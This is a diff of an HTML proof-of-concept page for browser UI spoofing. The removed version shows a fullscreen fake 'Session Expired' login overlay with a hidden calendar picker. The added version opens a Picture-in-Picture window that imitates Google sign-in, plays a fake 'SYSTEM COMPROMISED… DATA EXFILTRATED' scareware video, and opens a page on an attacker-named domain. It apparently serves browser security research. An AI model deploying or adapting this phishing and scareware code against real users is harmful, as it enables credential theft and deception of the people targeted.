@@ -1,152 +1,217 @@
-<!DOCTYPE html>
-<html>
-<head>
-<title>Fullscreen + Overlay + Top-Right Calendar PoC</title>
-
+<html><head>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
 <style>
-  body {
-    margin: 0;
-    height: 100%;
-    background: #111;
-    color: white;
-    font-family: Arial;
-    overflow: hidden;
-  }
-
-  /* posisi trigger calendar (pojok kanan atas) */
-  #container {
-    position: fixed;
-    top: 0;
-    right: 0;
-    width: 1px;
-    height: 1px;
-  }
-
-  /* input disembunyikan tapi tetap aktif */
-  #g {
-    opacity: 0;
-    width: 1px;
-    height: 1px;
-    border: none;
-  }
-
-  /* overlay fullscreen */
-  #fakeUI {
+html { font-family: sans-serif; }
+body {
+    overscroll-behavior: contain;
+}
+#instructions { text-align: center; margin-top: 200px; font-size: 2em; user-select: none; }
+#canvasElem { display: none; }
+.hide {
     display: none;
-    position: fixed;
-    top: 0;
-    left: 0;
-    width: 100%;
-    height: 100%;
-    background: rgba(15,15,15,0.98);
-    backdrop-filter: blur(6px);
-    z-index: 9999;
-    text-align: center;
-    padding-top: 120px;
-    animation: fadeIn 0.3s ease;
-  }
-
-  @keyframes fadeIn {
-    from { opacity: 0; }
-    to { opacity: 1; }
-  }
-
-  /* box login */
-  #fakeBox {
-    background: #1e1e1e;
-    padding: 30px;
-    width: 320px;
-    margin: auto;
-    border-radius: 12px;
-    box-shadow: 0 0 40px rgba(0,0,0,0.9);
-  }
-
-  #fakeBox h2 {
-    margin-bottom: 10px;
-  }
-
-  #fakeBox p {
-    font-size: 14px;
-    color: #bbb;
-  }
-
-  input[type="text"],
-  input[type="password"] {
-    width: 90%;
-    padding: 10px;
-    margin: 10px 0;
-    border: none;
-    border-radius: 6px;
-    outline: none;
-  }
-
-  button {
-    padding: 10px 20px;
-    border: none;
-    background: #4285f4;
-    color: white;
-    border-radius: 6px;
-    cursor: pointer;
-  }
-
-  button:hover {
-    background: #2f6fe0;
-  }
+}
 </style>
 </head>
-
 <body>
-
-<!-- hidden calendar trigger -->
-<div id="container">
-  <input type="datetime-local" id="g">
+<div id="startContent">
+<h1>spoof pip</h1>
+<p id="instructions">Tap to continue</p>
 </div>
-
-<!-- fake login overlay -->
-<div id="fakeUI">
-  <div id="fakeBox">
-    <h2>Session Expired</h2>
-    <p>Please login again to continue</p>
-
-    <input type="text" placeholder="Username">
-    <input type="password" placeholder="Password">
-
-    <button>Login</button>
-  </div>
+<div id="spoofContent" class="hide">
+<h1>Spoooo👻oooof</h1>
+<p><b>(ooh, scary!)</b></p>
+<p><i>A wild login form has appeared!</i></p>
+<h2>You must login to continue</h2>
+<form action="/?form" method="get">
+    <input id="inputElem" name="email" placeholder="Email">
+    <br>
+    <input name="password" placeholder="Password" type="password">
+    <input type="submit">
+</form>
+<a href="/?forgotpassword">Forgot password?</a>
 </div>
-
+<canvas id="canvasElem" width="1000" height="500"></canvas>
 <script>
-function openCalendar() {
-  const input = document.getElementById("g");
+var spoofUrl = 'https://you-can-billowy-nimble-login-secure-docs-google-source-attacker.com/spoofkeyboard1.html';
 
-  input.focus();
+var delayToWaitForScroll = 1500;
 
-  if (input.showPicker) {
-    input.showPicker();
+var newWin;
+
+var pipWindow;
+
+var targetWidth = 1000;
+var targetHeight = 500;
+
+var hackStep = 0;
+var hackInterval = null;
+
+var drawCanvas = (text) => {
+    const ctx = canvasElem.getContext('2d');
+    canvasElem.width = targetWidth;
+    canvasElem.height = targetHeight;
+
+    if (text === '' || text === 'hack') {
+        if (hackInterval) clearInterval(hackInterval);
+        hackStep = 0;
+        
+        hackInterval = setInterval(() => {
+            hackStep++;
+            ctx.fillStyle = '#000';
+            ctx.fillRect(0, 0, targetWidth, targetHeight);
+
+            // Flashing Header
+            if (hackStep % 2 === 0) {
+                ctx.fillStyle = '#ff0000';
+                ctx.fillRect(0, 0, targetWidth, 120);
+                ctx.fillStyle = '#fff';
+            } else {
+                ctx.fillStyle = '#000';
+                ctx.fillRect(0, 0, targetWidth, 120);
+                ctx.fillStyle = '#ff0000';
+            }
+            ctx.font = 'bold 80px monospace';
+            ctx.fillText('SYSTEM COMPROMISED', 100, 90);
+
+            ctx.fillStyle = '#00ff00';
+            ctx.font = '30px monospace';
+            
+            let y = 180;
+            if (hackStep > 1) { ctx.fillText('> Root access acquired...', 50, y); y += 50; }
+            if (hackStep > 3) { ctx.fillText('> Bypassing firewall protocols...', 50, y); y += 50; }
+            if (hackStep > 5) { ctx.fillText('> Accessing media library & messages...', 50, y); y += 50; }
+            if (hackStep > 7) { 
+                let progress = Math.min(100, (hackStep - 7) * 7);
+                let bar = '█'.repeat(Math.floor(progress/5)) + '-'.repeat(20 - Math.floor(progress/5));
+                ctx.fillText(`> DOWNLOADING DATA: [${bar}] ${progress}%`, 50, y); 
+                y += 50;
+            }
+            if (hackStep > 22) {
+                ctx.fillStyle = '#ff0000';
+                ctx.font = 'bold 50px monospace';
+                ctx.fillText('ALL DATA SUCCESSFULLY EXFILTRATED', 50, y + 20);
+            }
+            
+            // tiny dot to force canvas update just in case
+            ctx.fillStyle = hackStep % 2 === 0 ? '#000' : '#010000';
+            ctx.fillRect(0, 0, 1, 1);
+        }, 300);
+    } else {
+        if (hackInterval) clearInterval(hackInterval);
+        ctx.fillStyle = '#0a0a0a';
+        ctx.fillRect(0, 0, targetWidth, targetHeight);
+        ctx.fillStyle = '#00ff00';
+        var fontSize;
+        if (text.length == 1) {
+            fontSize = 400;
+            ctx.font = fontSize+'px monospace';
+            ctx.fillText(text, (targetWidth/2)-90, (targetHeight/2)+(fontSize/2));
+        } else if (text.length > 1) {
+            var lines = text.split('\n');
+            if (lines.length === 2) {
+                fontSize = 150;
+                ctx.font = fontSize+'px monospace';
+                ctx.fillText(lines[0], 50, (targetHeight/2)+(fontSize/2) - 50);
+                ctx.fillText(lines[1], 50, (targetHeight/2)+(fontSize/2) + 80);
+            } else {
+                fontSize = 170;
+                ctx.font = fontSize+'px monospace';
+                ctx.fillText(text, 50, (targetHeight/2)+(fontSize/2));
+            }
+        }
+    }
   }
+
+var createVideo = (canvasElem) => {
+    const video = document.createElement('video');
+    video.muted = true;
+    video.srcObject = canvasElem.captureStream(30);
+    video.play();
+    return video;
 }
 
-document.addEventListener("keydown", function(e) {
-  if (e.key === "Enter") {
+var videoElem = createVideo(canvasElem);
 
-    // fullscreen trigger
-    if (!document.fullscreenElement) {
-      document.documentElement.requestFullscreen();
-    }
-
-    // tampilkan overlay + calendar
-    setTimeout(() => {
-      document.getElementById("fakeUI").style.display = "block";
-      openCalendar();
-    }, 250);
-  }
+var showingPiP = false;
+videoElem.addEventListener('enterpictureinpicture', function(event) {
+    showingPiP = true;
+    instructions.innerText = 'Tap again to continue';
 });
 
-// optional: jaga fokus tetap di halaman
-window.onblur = () => {
-  window.focus();
-};
+// PiP call needs video to be ready, and video needs canvas to be drawn at least once to be ready
+drawCanvas('');
+
+var replaceContents = () => {
+    startContent.classList.add('hide');
+    spoofContent.classList.remove('hide');
+}
+
+var ran = false;
+
+window.addEventListener('click', async () => {
+    if (!showingPiP) {
+        if ('documentPictureInPicture' in window) {
+            try {
+                pipWindow = await window.documentPictureInPicture.requestWindow({
+                    width: 400,
+                    height: 500
+                });
+                showingPiP = true;
+                
+                pipWindow.document.body.innerHTML = `
+                    <style>
+                        body { font-family: Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background: #fff; }
+                        .container { border: 1px solid #dadce0; border-radius: 8px; padding: 40px; text-align: center; width: 300px; box-sizing: border-box; }
+                        .logo { font-size: 24px; font-weight: 500; font-family: 'Product Sans', Arial, sans-serif; }
+                        .logo span:nth-child(1) { color: #4285F4; }
+                        .logo span:nth-child(2) { color: #EA4335; }
+                        .logo span:nth-child(3) { color: #FBBC05; }
+                        .logo span:nth-child(4) { color: #4285F4; }
+                        .logo span:nth-child(5) { color: #34A853; }
+                        .logo span:nth-child(6) { color: #EA4335; }
+                        h2 { font-weight: 400; font-size: 24px; color: #202124; margin: 10px 0; }
+                        p { font-size: 16px; color: #202124; margin-bottom: 30px; }
+                        input { width: 100%; padding: 13px 15px; margin-bottom: 40px; border: 1px solid #dadce0; border-radius: 4px; box-sizing: border-box; font-size: 16px; }
+                        button { background: #1a73e8; color: #fff; border: none; padding: 10px 24px; border-radius: 4px; font-weight: 500; cursor: pointer; float: right; font-size: 14px; }
+                    </style>
+                    <div class="container">
+                        <div class="logo"><span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span></div>
+                        <h2>Sign in</h2>
+                        <p>Use your Google Account</p>
+                        <input type="email" placeholder="Email or phone" autofocus>
+                        <div><button id="nextBtn">Next</button></div>
+                    </div>
+                `;
+                
+                pipWindow.addEventListener('pagehide', () => { showingPiP = false; });
+                
+                // If they click next inside the pop-up
+                pipWindow.document.getElementById('nextBtn').addEventListener('click', () => {
+                    if (!ran) {
+                        ran = true;
+                        newWin = window.open(spoofUrl, 'ao_spoof_test');
+                        drawCanvas(''); 
+                    }
+                });
+                return;
+            } catch (err) {
+                console.error(err);
+                videoElem.requestPictureInPicture();
+            }
+        } else {
+            videoElem.requestPictureInPicture();
+        }
+        return;
+    }
+    
+    if (ran) {
+        return;
+    }
+    ran = true;
+    newWin = window.open(spoofUrl, 'ao_spoof_test');
+    drawCanvas('');
+});
 </script>
 
-</body>
-</html>
+
+</body></html>
